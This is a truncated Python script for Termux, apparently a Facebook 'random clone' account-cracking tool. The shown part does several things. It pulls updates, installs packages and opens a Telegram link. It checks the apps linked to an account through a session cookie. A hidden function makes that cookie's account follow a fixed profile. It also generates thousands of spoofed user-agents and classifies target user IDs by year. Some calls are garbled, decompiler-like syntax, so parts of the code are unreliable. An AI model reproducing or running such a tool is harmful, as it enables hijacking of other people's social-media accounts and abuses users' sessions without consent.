
import os
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/itz.ongkon.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
import os
os.system("pkg install espeak")
print("walcome to SEE Tarmux KGF TEM ")
os.system("pkg install espeak")
from os import system as _EMRAN_
def lo(word):
    emran = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(emran)):
            sys.stdout.write(('\r{}{}').format(str(word), emran[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def logo():
	color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
logo = ("""

\033[1;35m@@@@@@@@  \033[38;5;46m@@@  @@@   \033[37;1m@@@@@@@  
\033[1;35m@@@@@@@@  \033[38;5;46m@@@  @@@  \033[37;1m@@@@@@@@  
\033[1;35m@@!       \033[38;5;46m@@!  @@@  \033[37;1m!@@       
\033[1;35m!@!       \033[38;5;46m!@!  @!@  \033[37;1m!@!       
\033[1;35m@!!!:!    \033[38;5;46m@!@!@!@!  \033[37;1m!@!       
\033[1;35m!!!!!:    \033[38;5;46m!!!@!!!!  \033[37;1m!!!       
\033[1;35m!!:       \033[38;5;46m!!:  !!!  \033[37;1m:!!       
\033[1;35m:!:       \033[38;5;46m:!:  !:!  \033[37;1m:!:       
\033[1;35m:: ::::   \033[38;5;46m::   :::  \033[37;1m::: :::  
\033[1;35m: :: ::    \033[38;5;46m:   : :  \033[37;1m:: :: :
\033[38;5;46m══════════════════════════════
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ \033[38;5;46m𝗧𝗢𝗢𝗟𝗦    : \033[38;5;46m𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗘  ┃
┃ \033[38;5;46m𝗢𝗪𝗡𝗘𝗥    : \033[38;5;46m𝗘𝗛𝗖 𝗘𝗠𝗥𝗔𝗡     ┃
┃ \033[38;5;46m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : \033[38;5;46m𝗘𝗠𝗥𝗔𝗡         ┃
┃ \033[38;5;46m𝗪𝗛𝗔𝗧'𝗦𝗔𝗣𝗣: \033[38;5;46m+𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-N909O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4414.144 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 630"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"}
header_grup = {"user-agent": "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-N909O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4414.144 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 630"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"}
header_grup = {"user-agent": "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
Afridi2=requests.get("https://github.com/Emran-cyber99487/EMRAN-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
er=requests.get("https://github.com/Emran-cyber99487/EMRAN-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
